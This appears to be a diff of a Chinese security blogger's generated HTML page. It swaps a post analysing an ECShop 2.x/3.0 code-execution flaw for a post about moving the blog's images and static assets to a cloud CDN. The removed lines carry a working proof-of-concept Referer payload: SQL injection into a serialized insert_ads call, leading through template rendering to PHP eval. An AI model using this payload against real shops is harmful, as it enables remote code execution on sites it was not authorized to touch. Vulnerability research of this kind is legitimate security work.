@@ -123,20 +123,37 @@
 
 
 
-  <meta name="description" content="之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下">
-<meta name="keywords" content="Crypto">
+  <meta name="keywords" content="Others">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ECShop 2.x 3.0代码执行漏洞分析">
-<meta property="og:url" content="https://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/index.html">
+<meta property="og:title" content="博客上云优化小记">
+<meta property="og:url" content="https://0day.design/2020/03/20/博客上云小记/index.html">
 <meta property="og:site_name" content="Passer6y&#39;s Blog">
-<meta property="og:description" content="之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://0day.design/2019/09/30/ECShop%202.x%203.0代码执行漏洞分析/media/15696548589918/15696662119731.jpg">
-<meta property="og:updated_time" content="2020-03-19T12:47:56.509Z">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231873.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231570.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231579.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231597.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231606.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231645.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231653.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231661.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231669.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231678.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231702.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231710.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231724.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231735.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231746.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231754.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231788.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231841.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231856.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231865.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231873.jpg">
+<meta property="og:updated_time" content="2020-03-20T04:04:19.094Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ECShop 2.x 3.0代码执行漏洞分析">
-<meta name="twitter:description" content="之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下">
-<meta name="twitter:image" content="https://0day.design/2019/09/30/ECShop%202.x%203.0代码执行漏洞分析/media/15696548589918/15696662119731.jpg">
+<meta name="twitter:title" content="博客上云优化小记">
+<meta name="twitter:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231873.jpg">
 
 
 
@@ -145,7 +162,7 @@
 
 
 
-  <link rel="canonical" href="https://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/"/>
+  <link rel="canonical" href="https://0day.design/2020/03/20/博客上云小记/"/>
 
 
 
@@ -155,7 +172,7 @@
   };
 </script>
 
-  <title>ECShop 2.x 3.0代码执行漏洞分析 | Passer6y's Blog</title>
+  <title>博客上云优化小记 | Passer6y's Blog</title>
   
 
 
@@ -389,7 +406,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/">
+    <link itemprop="mainEntityOfPage" href="https://0day.design/2020/03/20/博客上云小记/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Passer6y">
@@ -406,7 +423,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ECShop 2.x 3.0代码执行漏洞分析
+          <h1 class="post-title" itemprop="name headline">博客上云优化小记
               
             
           </h1>
@@ -431,28 +448,34 @@
                 
               
 
-              <time title="Created: 2019-09-30 22:10:00" itemprop="dateCreated datePublished" datetime="2019-09-30T22:10:00+08:00">2019-09-30</time>
+              <time title="Created: 2020-03-20 12:03:00 / Modified: 12:04:19" itemprop="dateCreated datePublished" datetime="2020-03-20T12:03:00+08:00">2020-03-20</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-03-19 20:47:56" itemprop="dateModified" datetime="2020-03-19T20:47:56+08:00">2020-03-19</time>
               
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Others/" itemprop="url" rel="index"><span itemprop="name">Others</span></a></span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -462,8 +485,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/" itemprop="commentCount"></span>
+                <a href="/2020/03/20/博客上云小记/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2020/03/20/博客上云小记/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -491,20 +514,45 @@
       
 
       
-        <p>之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下<br><a id="more"></a></p>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前渗透时遇到了这样一个站，当时看到这个命令执行的过程有点东西，于是抽了个时间复现一下</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>IDE: PHPstorm<br>代码：<br><a href="https://github.com/ec-shop/ecshop3.0.0906" target="_blank" rel="noopener">ECshop3.0</a><br><a href="https://github.com/shopex/ecshop" target="_blank" rel="noopener">ECShop 2.7.3</a></p>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>ECshop3.0<br>php 5.6<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;&#125;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/media/15696548589918/15696662119731.jpg" alt="-w1613"></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>user.php 305行渲染的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//310行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 如果没有user.php， 则$back_act为referer</span></span><br><span class="line">    $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 330行</span></span><br><span class="line">$smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);     <span class="comment">// 渲染referer到模板</span></span><br><span class="line">$smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br></pre></td></tr></table></figure></p>
-<p>跟进<code>display</code>函数，includes/cls_template.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 106行</span><br><span class="line">$out = $this-&gt;fetch($filename, $cache_id);  // fetch模板，渲染变量</span><br><span class="line"></span><br><span class="line">if (strpos($out, $this-&gt;_echash) !== false)</span><br><span class="line">&#123;</span><br><span class="line">    $k = explode($this-&gt;_echash, $out); // _echash为定值</span><br><span class="line">    foreach ($k AS $key =&gt; $val)</span><br><span class="line">    &#123;</span><br><span class="line">        if (($key % 2) == 1)    // 如果是奇数个</span><br><span class="line">        &#123;       </span><br><span class="line">                // 45ea207d7a2b68c49582d2d22adf953a这个相当于分割符，方便从html提取出序列化数据</span><br><span class="line">            $k[$key] = $this-&gt;insert_mod($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $out = implode(&apos;&apos;, $k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>跟进<code>insert_mod</code>函数，includes/cls_template.php 1168行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function insert_mod($name) // 处理动态内容</span><br><span class="line">&#123;</span><br><span class="line">    list($fun, $para) = explode(&apos;|&apos;, $name); // |前的为函数名，后为参数</span><br><span class="line">    $para = unserialize($para);</span><br><span class="line">    $fun = &apos;insert_&apos; . $fun;</span><br><span class="line"></span><br><span class="line">    return $fun($para);     // 可以执行insert_开头的函数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>可以通过控制referer，执行<code>insert_</code>开头的任意函数，来看includes/lib_insert.php：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// 141行</span><br><span class="line">function insert_ads($arr)</span><br><span class="line">&#123;</span><br><span class="line">    static $static_res = NULL;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    if (!empty($arr[&apos;num&apos;]) &amp;&amp; $arr[&apos;num&apos;] != 1)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql  = &apos;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &apos; .</span><br><span class="line">                    &apos;p.ad_height, p.position_style, RAND() AS rnd &apos; .</span><br><span class="line">                &apos;FROM &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad&apos;) . &apos; AS a &apos;.</span><br><span class="line">                &apos;LEFT JOIN &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad_position&apos;) . &apos; AS p ON a.position_id = p.position_id &apos; .</span><br><span class="line">                &quot;WHERE enabled = 1 AND start_time &lt;= &apos;&quot; . $time . &quot;&apos; AND end_time &gt;= &apos;&quot; . $time . &quot;&apos; &quot;.</span><br><span class="line">                    &quot;AND a.position_id = &apos;&quot; . $arr[&apos;id&apos;] . &quot;&apos; &quot; .</span><br><span class="line">                &apos;ORDER BY rnd LIMIT &apos; . $arr[&apos;num&apos;];</span><br><span class="line">        $res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    // arr可控，形成sql注入， 继续往下跟</span><br><span class="line"></span><br><span class="line">// 170行</span><br><span class="line">    foreach ($res AS $row)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($row[&apos;position_id&apos;] != $arr[&apos;id&apos;]) // 查库的第2列字段</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        $position_style = $row[&apos;position_style&apos;]; // 查库的第9列</span><br><span class="line">        $GLOBALS[&apos;smarty&apos;]-&gt;assign(&apos;ads&apos;, $ads);</span><br><span class="line">        $val = $GLOBALS[&apos;smarty&apos;]-&gt;fetch($position_style); // 重新带入模板渲染</span><br></pre></td></tr></table></figure></p>
-<p>接着，includes/patch/includes_cls_template_fetch_str.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$template = $this;</span><br><span class="line">return preg_replace_callback(&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/&quot;, function($r) use(&amp;$template)&#123;return $template-&gt;select($r[1]);&#125;, $source);</span><br></pre></td></tr></table></figure></p>
-<p>调select函数，includes/cls_template.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//375行 </span><br><span class="line">return &apos;&lt;?php echo &apos; . $this-&gt;get_val(substr($tag, 1)) . &apos;; ?&gt;&apos;;</span><br></pre></td></tr></table></figure></p>
-<p>includes/cls_template.php <code>get_val</code>593行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 处理掉变量标签</span><br><span class="line">$p = $this-&gt;make_var($val);</span><br></pre></td></tr></table></figure></p>
-<p>跟进<code>make_var</code>, includes/cls_template.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_var</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'.'</span>) === <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$val]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$val]))</span><br><span class="line">        &#123;</span><br><span class="line">            $val = <span class="keyword">$this</span>-&gt;_patchstack[$val];</span><br><span class="line">        &#125;</span><br><span class="line">        $p = <span class="string">'$this-&gt;_var[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 705行</span></span><br><span class="line">    <span class="keyword">return</span> $p;</span><br></pre></td></tr></table></figure></p>
-<p>代码执行，includes/cls_template.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//1193行</span><br><span class="line">function _eval($content)</span><br><span class="line">&#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    eval(&apos;?&apos; . &apos;&gt;&apos; . trim($content));</span><br><span class="line">    $content = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line"></span><br><span class="line">    return $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+        <hr>
+<a id="more"></a>
+<p><strong>先说结论，千万别用千牛云！！</strong></p>
+<p><strong>优化结果：</strong> 从以前的8秒都出不来，到现在秒开：</p>
+<p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231873.jpg" alt="-w697"></p>
+<p>最开始是迫于图床需求，之前一直用的<code>sm.ms</code>，最开始速度慢就算了，凑合用一下，到后来把我传的图片ban掉了，导致之前写的文章图片大量404，关键是重新传也传不上..</p>
+<p>加上最近写了一篇图片贼多的文章，访问速度巨慢，忍不住就开始找图床。</p>
+<p>很早之前看到千牛云每个月免费10G S3对象存储，但是要身份证照片，一直搁置没用，昨天分析完漏洞无事，就一起把之前吃灰的域名都实名了。</p>
+<p>之前一直以为满足我图床需求的免费的10g s3能不花钱，后来在配置过程中发现这玩意必须和cdn捆绑使用，好了，七牛云cdn http免费10g流量，用过github page的都知道配置https就是一个按钮的事情，不过问题不大，https的站img用http加载，就是主页有锁，点进文章内容没锁的区别。</p>
+<p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231570.jpg" alt="-w421"></p>
+<p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231579.jpg" alt="-w558"></p>
+<p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231597.jpg" alt="-w1132"></p>
+<blockquote>
+<p>用国内cdn最麻烦的地方在于要备案，这里好在白嫖了一个小组的d0g3.cn域名，省去了很多麻烦。</p>
+</blockquote>
+<p>优化完图片后，访问是快了很多，影响加载的主要因素变成了js和css，然后想顺手把hexo的public目录给拉到s3上。</p>
+<p>然后我人傻了，他这个不能上传文件夹就很离谱：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231606.jpg" alt="-w920"></p>
+<p>然后康师傅让我用ftp传上去(他用的又拍云)，找了半天连接工具，然后搜怎么用：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231645.jpg" alt="-w866"></p>
+<p>继续找解决办法…<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231653.jpg" alt="-w845"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231661.jpg" alt="-w499"></p>
+<p>最后找了个他们推出的<code>qshell</code>命令行工具，想想也算了，<code>hexo</code>也要用命令行，就无所谓了。</p>
+<p>把静态资源同步上去，完了在next里配置一下：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231669.jpg" alt="-w492"><br>结果博客成这样了：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231678.jpg" alt="-w418"><br>对，https的站加载不了http的js资源。。</p>
+<p>这里为了白嫖10g的http cdn流量，我把hexo全部https全换成了http。</p>
+<p>改完之后，这里有个很严重的问题，以前拿https访问过的，之后拿http访问，浏览器会有缓存自动跳https，可是我站强制访问https就会像上图那样，没🔐没js。。</p>
+<p>这里我想了个骚主意，插了下边一段代码放在了主页：强制跳转成http…<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231702.jpg" alt="-w694"></p>
+<p>测试了一下，结果就是在chrome缓存和js的双重加持下，http-&gt;https-&gt;http，死循环….</p>
+<blockquote>
+<p>这里是关了github page的force https测试的，依旧如此…</p>
+</blockquote>
+<p>屈服了，最后还是选择氪金吧，都花了这么多时间折腾了，不想换厂商了…<br>CDN和S3分别收费：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231710.jpg" alt="-w954"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231724.jpg" alt="-w689"><br>为了节约流量，我还加了一个这个<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231735.jpg" alt="-w702"><br>后来@0akarma师傅给我说，这些在又拍云都是免费的，我…</p>
+<p>好了，全站https之后，又有新的问题了：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231746.jpg" alt="-w1670"><br>woff等字体文件要配一个跨域资源共享(CORS)，然后凭着印象记得S3对象存储那有一个资源共享配置：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231754.jpg" alt="-w1469"></p>
+<p>配了之后以为要延迟生效，出去打了个球回来，还是不行，然后网上搜了一下：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231788.jpg" alt="-w1077"><br>这波操作属实给我整吐了，在七牛云控制台转了一天，也没看到CDN有跨域的配置。后来想想也确实得在CDN的响应上配置。</p>
+<p>后来还遇到几个小问题，woff字体的referer是css，而不是url，这里在防盗链referer校验难多加一个白名单就行了：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231841.jpg" alt="-w719"></p>
+<p>到现在，就只有html在github上了，我访问<a href="https://static-passer6y.d0g3.cn/，不也是我的博客吗，为什么还要用github" target="_blank" rel="noopener">https://static-passer6y.d0g3.cn/，不也是我的博客吗，为什么还要用github</a> page呢，而且还解决了html加载慢的问题。</p>
+<p>然后我就想着去加一个<code>@</code>的<code>cname</code>解析到<code>static-passer6y.d0g3.cn</code>，在这之前我配了一个<code>mx</code>的<code>@</code>记录，用来收邮件的。</p>
+<p>一波操作下，阿里云不支持@的cname和mx记录共存…<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231856.jpg" alt="-w433"></p>
+<p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231865.jpg" alt="-w943"></p>
+<p>算了不折腾了，除了html文件在github上，其他的都优化了。</p>
+<p>最后，折腾了大半天，七牛云控制台给俺整吐了，人生忠告，千万别用<em>七牛云</em>..</p>
+<p>第一次上云真香，就是流量有点贵。<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231873.jpg" alt="-w697"></p>
 
       
     </div>
@@ -527,7 +575,7 @@
     <strong>Post author:  </strong>Passer6y</li>
   <li class="post-copyright-link">
     <strong>Post link: </strong>
-    <a href="https://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/" title="ECShop 2.x 3.0代码执行漏洞分析">https://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/</a>
+    <a href="https://0day.design/2020/03/20/博客上云小记/" title="博客上云优化小记">https://0day.design/2020/03/20/博客上云小记/</a>
   </li>
   <li class="post-copyright-license">
     <strong>Copyright Notice:  </strong>本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/3.0/deed.zh">CC BY-NC-SA 3.0</a>许可协议。转载请注明出处！</li>
@@ -540,7 +588,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Crypto/" rel="tag"><i class="fa fa-tag"></i> Crypto</a>
+            <a href="/tags/Others/" rel="tag"><i class="fa fa-tag"></i> Others</a>
           
         </div>
       
@@ -553,8 +601,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/27/RSA小结/" rel="next" title="RSA小结">
-                <i class="fa fa-chevron-left"></i> RSA小结
+              <a href="/2020/03/19/Weblogic IIOP反序列化漏洞分析/" rel="next" title="Weblogic IIOP反序列化漏洞分析(CVE-2020-2551)">
+                <i class="fa fa-chevron-left"></i> Weblogic IIOP反序列化漏洞分析(CVE-2020-2551)
               </a>
             
           </div>
@@ -562,10 +610,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/01/08/NodeJS Headless 动态漏扫爬虫学习记录(爬虫篇)/" rel="prev" title="NodeJS Headless 动态漏扫爬虫学习记录(爬虫篇)">
-                NodeJS Headless 动态漏扫爬虫学习记录(爬虫篇) <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -617,17 +661,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -803,22 +838,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">3.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
